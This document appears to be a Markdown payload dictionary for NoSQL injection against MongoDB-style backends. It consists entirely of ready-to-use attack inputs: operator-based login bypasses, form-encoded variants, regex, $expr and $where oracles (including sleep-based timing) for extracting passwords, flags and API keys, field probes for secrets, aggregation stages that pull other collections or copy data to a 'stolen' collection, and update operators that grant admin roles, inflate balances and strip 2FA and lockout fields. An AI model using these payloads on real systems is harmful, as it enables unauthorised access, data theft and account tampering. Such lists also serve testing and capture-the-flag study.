# Payload dictionary — the NoSQLi corpus

## Auth-bypass — the `$ne`/`$gt`/`$regex` family

```json
{"user": {"$ne": null}, "pass": {"$ne": null}}
{"user": {"$ne": "x"}, "pass": {"$ne": "x"}}
{"user": {"$ne": ""}, "pass": {"$ne": ""}}
{"user": {"$ne": 0}, "pass": {"$ne": 0}}
{"user": {"$ne": []}, "pass": {"$ne": []}}
{"user": {"$ne": false}, "pass": {"$ne": false}}
{"user": {"$nin": []}, "pass": {"$nin": []}}
{"user": {"$nin": ["x"]}, "pass": {"$nin": ["x"]}}
{"user": {"$gt": ""}, "pass": {"$gt": ""}}
{"user": {"$gte": ""}, "pass": {"$gte": ""}}
{"user": {"$gt": " "}, "pass": {"$gt": " "}}
{"user": {"$gt": null}, "pass": {"$gt": null}}
{"user": {"$regex": ".*"}, "pass": {"$regex": ".*"}}
{"user": {"$regex": "^"}, "pass": {"$regex": "^"}}
{"user": {"$regex": "^a"}, "pass": {"$regex": "^a"}}
{"user": {"$regex": ".+"}, "pass": {"$regex": ".+"}}
{"user": {"$exists": true}, "pass": {"$exists": true}}
{"user": {"$type": "string"}, "pass": {"$type": "string"}}
{"user": {"$type": 2}, "pass": {"$type": 2}}
{"user": {"$not": {"$eq": "x"}}, "pass": {"$not": {"$eq": "x"}}}
{"user": {"$not": {"$type": 10}}, "pass": {"$not": {"$type": 10}}}
{"user": {"$not": {"$exists": false}}, "pass": {"$not": {"$exists": false}}}
```

## Targeted — `{"user": "admin", ...}`

```json
{"user": "admin", "pass": {"$ne": null}}
{"user": "admin", "pass": {"$ne": "x"}}
{"user": "admin", "pass": {"$gt": ""}}
{"user": "admin", "pass": {"$regex": ".*"}}
{"user": "admin", "pass": {"$exists": true}}
{"user": {"$regex": "^admin"}, "pass": {"$ne": null}}
{"user": {"$regex": "^adm"}, "pass": {"$ne": null}}
{"user": {"$regex": "admin$"}, "pass": {"$ne": null}}
{"user": {"$in": ["admin", "root", "test"]}, "pass": {"$ne": null}}
```

## Form-syntax — `user[$ne]=x`

```text
user[$ne]=x&pass[$ne]=x
user[$ne]=&pass[$ne]=
user[$ne]=null&pass[$ne]=null
user[$gt]=&pass[$gt]=
user[$gt]= &pass[$gt]= 
user[$regex]=.*&pass[$regex]=.*
user[$regex]=^&pass[$regex]=^
user[$nin][]=x&pass[$nin][]=x
user[$exists]=true&pass[$exists]=true
user[$not][$eq]=x&pass[$not][$eq]=x
user[$type]=2&pass[$type]=2
user%5B%24ne%5D=x&pass%5B%24ne%5D=x
filter[user][$ne]=x&filter[pass][$ne]=x
q[user][$ne]=x
data[user][$ne]=x
credentials[user][$ne]=x
credentials[0][user][$ne]=x
```

## `$or`/`$and`/`$nor` — the logical family

```json
{"$or": [{"user": "admin"}, {"user": "x"}]}
{"$or": [{"user": "admin"}, {"user": {"$ne": null}}]}
{"$or": [{"_id": {"$exists": true}}, {}]}
{"$or": [{"user": "admin"}, {"pass": "x"}]}
{"$and": [{"user": "admin"}, {"pass": {"$ne": null}}]}
{"$and": [{"user": "admin"}, {"pass": {"$regex": "^a"}}]}
{"$nor": [{"user": "nosuch"}]}
{"$nor": [{"user": "x"}, {"pass": "y"}]}
{"$not": {"$eq": "nosuch"}}
{"$not": {"$type": 10}}
{"$not": {"$exists": false}}
{"$not": {"$in": ["x", "y"]}}
```

## `$regex` extraction — the prefix-oracles

```json
{"pass": {"$regex": "^a"}}
{"pass": {"$regex": "^ab"}}
{"pass": {"$regex": "^abc"}}
{"pass": {"$regex": "a$"}}
{"pass": {"$regex": "^.{20}$"}}
{"pass": {"$regex": "^.{1,10}$"}}
{"pass": {"$regex": "^.{20,}$"}}
{"pass": {"$regex": ".a"}}
{"pass": {"$regex": "^.a"}}
{"pass": {"$regex": "^.{3}a"}}
{"pass": {"$regex": "^[a-f]"}}
{"pass": {"$regex": "^[0-9a-f]"}}
{"pass": {"$regex": "^flag"}}
{"pass": {"$regex": "^flag\\{"}}
{"pass": {"$regex": "^flag\\{[a-z0-9_]+\\}$"}}
{"flag": {"$regex": "^flag\\{"}}
{"flag": {"$regex": "^flag\\{a"}}
{"flag": {"$regex": "flag"}}
{"flag": {"$regex": "flag.*"}}
{"flag": {"$regex": "^.{10,100}$"}}
{"flag": {"$regex": "^.{0,5}$"}}
{"token": {"$regex": "^[a-z0-9]"}}
{"secret": {"$regex": "^sk_"}}
{"api_key": {"$regex": "^[A-Za-z0-9]{32}$"}}
```

## `$exists` — the field-discovery

```json
{"admin": {"$exists": true}}
{"role": {"$exists": true}}
{"isAdmin": {"$exists": true}}
{"is_admin": {"$exists": true}}
{"flag": {"$exists": true}}
{"secret": {"$exists": true}}
{"password": {"$exists": true}}
{"token": {"$exists": true}}
{"api_key": {"$exists": true}}
{"apiKey": {"$exists": true}}
{"private_key": {"$exists": true}}
{"salt": {"$exists": true}}
{"hash": {"$exists": true}}
{"2fa": {"$exists": true}}
{"otp": {"$exists": true}}
{"reset_token": {"$exists": true}}
{"resetToken": {"$exists": true}}
{"session": {"$exists": true}}
{"session_id": {"$exists": true}}
{"email": {"$exists": true}}
{"username": {"$exists": true}}
{"_id": {"$exists": true}}
{"__v": {"$exists": true}}
{"createdAt": {"$exists": true}}
{"updatedAt": {"$exists": true}}
{"balance": {"$exists": true}}
{"credits": {"$exists": true}}
{"tier": {"$exists": true}}
{"permissions": {"$exists": true}}
{"groups": {"$exists": true}}
{"verified": {"$exists": true}}
{"locked": {"$exists": true}}
{"banned": {"$exists": true}}
{"admin_notes": {"$exists": true}}
{"internal": {"$exists": true}}
{"private": {"$exists": true}}
{"public": {"$exists": true}}
{"deleted": {"$exists": true}}
{"deleted_at": {"$exists": true}}
{"meta": {"$exists": true}}
{"profile": {"$exists": true}}
{"settings": {"$exists": true}}
{"config": {"$exists": true}}
{"env": {"$exists": true}}
```

## `$gt`/`$lt` — the range-oracles

```json
{"pass": {"$gt": "m"}}
{"pass": {"$lt": "m"}}
{"pass": {"$gte": "a", "$lt": "b"}}
{"pass": {"$gt": "f", "$lt": "g"}}
{"age": {"$gt": 18}}
{"balance": {"$gt": 0}}
{"id": {"$gt": 0}}
{"id": {"$lt": 100}}
{"_id": {"$gt": {"$oid": "..."}}}
{"created": {"$gt": {"$date": "2020-01-01"}}}
```

## `$where` — the JS-predicates (if `enableJs`)

```json
{"user": {"$where": "this.user == 'admin'"}}
{"user": {"$where": "1==1"}}
{"user": {"$where": "true"}}
{"user": {"$where": "this.pass[0] == 'f'"}}
{"user": {"$where": "this.pass[1] == 'l'"}}
{"user": {"$where": "this.pass.length == 20"}}
{"user": {"$where": "this.pass.length > 10"}}
{"user": {"$where": "this.pass.charCodeAt(0) == 102"}}
{"user": {"$where": "this.pass.startsWith('f')"}}
{"user": {"$where": "this.pass.endsWith('}')"}}
{"user": {"$where": "this.pass.indexOf('{') == 4"}}
{"user": {"$where": "this.pass.match(/^f/)"}}
{"user": {"$where": "this.pass.substr(0, 4) == 'flag'"}}
{"user": {"$where": "sleep(5000) || true"}}
{"user": {"$where": "this.pass[0] == 'f' ? sleep(3000) : true"}}
{"user": {"$where": "if (this.pass[0] == 'f') sleep(3000); true"}}
{"user": {"$where": "this.pass[0] == 'f' && sleep(3000)"}}
```

## `$expr` — the aggregation-operators in find

```json
{"$expr": {"$eq": ["$user", "admin"]}}
{"$expr": {"$eq": ["$user", {"$literal": "admin"}]}}
{"$expr": {"$regexMatch": {"input": "$pass", "regex": "^a"}}}
{"$expr": {"$regexMatch": {"input": "$pass", "regex": "^flag\\{"}}}
{"$expr": {"$eq": [{"$substr": ["$pass", 0, 1]}, "f"]}}
{"$expr": {"$eq": [{"$substr": ["$pass", 0, 4]}, "flag"]}}
{"$expr": {"$eq": [{"$substrCP": ["$pass", 0, 4]}, "flag"]}}
{"$expr": {"$eq": [{"$strLenCP": "$pass"}, 20]}}
{"$expr": {"$gt": [{"$strLenCP": "$pass"}, 10]}}
{"$expr": {"$lt": [{"$strLenCP": "$pass"}, 100]}}
{"$expr": {"$eq": [{"$indexOfCP": ["$pass", "{"]}, 4]}}
{"$expr": {"$eq": [{"$indexOfBytes": ["$pass", "{"]}, 4]}}
{"$expr": {"$eq": [{"$toUpper": "$pass"}, "FLAG{X}"]}}
{"$expr": {"$eq": [{"$toLower": "$pass"}, "flag{x}"]}}
{"$expr": {"$eq": [{"$strcasecmp": ["$pass", "flag{x}"]}, 0]}}
{"$expr": {"$eq": [{"$trim": {"input": "$pass"}}, "flag{x}"]}}
{"$expr": {"$eq": [{"$concat": ["$pass", ""]}, "flag{x}"]}}
{"$expr": {"$eq": [{"$substrBytes": ["$pass", 0, 4]}, "flag"]}}
{"$expr": {"$eq": [{"$split": ["$pass", "{"]}, ["flag", "x}"]]]}}
{"$expr": {"$eq": [{"$type": "$pass"}, "string"]}}
{"$expr": {"$eq": [{"$type": "$flag"}, "string"]}}
{"$expr": {"$eq": [{"$binarySize": "$pass"}, 20]}}
{"$expr": {"$eq": [{"$isArray": "$tags"}, true]}}
{"$expr": {"$eq": [{"$size": "$tags"}, 3]}}
{"$expr": {"$in": ["admin", "$roles"]}}
{"$expr": {"$eq": [{"$first": "$roles"}, "admin"]}}
{"$expr": {"$eq": [{"$last": "$roles"}, "admin"]}}
{"$expr": {"$eq": [{"$arrayElemAt": ["$roles", 0]}, "admin"]}}
```

## Aggregation — the pipeline-shapes

```json
[{"$unionWith": "users"}]
[{"$unionWith": "secrets"}]
[{"$unionWith": "flag"}]
[{"$unionWith": "admin"}]
[{"$unionWith": "config"}]
[{"$unionWith": {"coll": "users", "pipeline": [{"$match": {}}]}}]
[{"$limit": 1}, {"$unionWith": "users"}]
[{"$match": {}}, {"$unionWith": "flag"}]
[{"$unionWith": "flag"}, {"$match": {"_id": {"$exists": true}}}]
[{"$unionWith": "users"}, {"$project": {"pass": 1}}]
[{"$unionWith": "flag"}, {"$project": {"flag": 1}}]
[{"$lookup": {"from": "users", "localField": "user_id", "foreignField": "_id", "as": "user"}}]
[{"$lookup": {"from": "flag", "pipeline": [], "as": "f"}}]
[{"$facet": {"users": [{"$match": {}}], "secrets": [{"$unionWith": "flag"}]}}]
[{"$project": {"flag": 1, "_id": 0}}]
[{"$project": {"data": "$secret"}}]
[{"$group": {"_id": null, "n": {"$sum": 1}}}]
[{"$count": "total"}]
[{"$match": {}}, {"$out": "stolen"}]
[{"$match": {}}, {"$merge": {"into": "stolen"}}]
[{"$match": {"$expr": {"$eq": ["$user", "admin"]}}}]
[{"$match": {"$expr": {"$regexMatch": {"input": "$pass", "regex": "^a"}}}}]
[{"$addFields": {"x": {"$function": {"body": "function() { return 1; }", "args": [], "lang": "js"}}}}]
[{"$addFields": {"x": {"$function": {"body": "function(pass) { return pass.startsWith('f'); }", "args": ["$pass"], "lang": "js"}}}}]
```

## Update — the write-operators

```json
{"$set": {"role": "admin"}}
{"$set": {"isAdmin": true}}
{"$set": {"verified": true}}
{"$set": {"balance": 1000000}}
{"$set": {"tier": "premium"}}
{"$set": {"credits": 999}}
{"$set": {"flag_access": true}}
{"$set": {"role": {"$literal": "admin"}}}
{"$unset": {"isLocked": ""}}
{"$unset": {"banned": ""}}
{"$unset": {"2fa_secret": ""}}
{"$unset": {"rate_limit": ""}}
{"$unset": {"lockout_until": ""}}
{"$inc": {"balance": 1000000}}
{"$inc": {"credits": 999}}
{"$inc": {"login_attempts": -100}}
{"$inc": {"points": 9999}}
{"$rename": {"user": "admin_name"}}
{"$rename": {"temp": "role"}}
{"$push": {"roles": "admin"}}
{"$addToSet": {"permissions": "admin"}}
{"$push": {"groups": {"$each": ["admin", "root"]}}}
{"$pull": {"roles": "user"}}
{"$pop": {"roles": 1}}
{"$pull": {"restrictions": "read_only"}}
{"$max": {"score": 9999}}
{"$min": {"age": 18}}
{"$currentDate": {"verified_at": true}}
{"$currentDate": {"last_login": {"$type": "timestamp"}}}
{"$mul": {"price": 0}}
{"$mul": {"balance": 100}}
{"$bit": {"flags": {"or": 4}}}
{"$setOnInsert": {"role": "admin"}}
```
